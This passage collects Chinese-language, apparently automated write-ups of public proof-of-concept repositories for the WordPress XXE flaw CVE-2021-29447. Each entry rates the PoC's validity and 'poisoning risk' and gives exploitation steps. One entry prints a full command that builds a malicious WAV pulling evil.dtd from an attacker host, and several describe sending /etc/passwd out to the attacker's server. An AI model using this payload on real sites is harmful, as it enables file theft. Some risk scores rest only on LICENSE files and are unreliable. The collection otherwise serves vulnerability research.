1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #19

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---



---

## POC #9

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
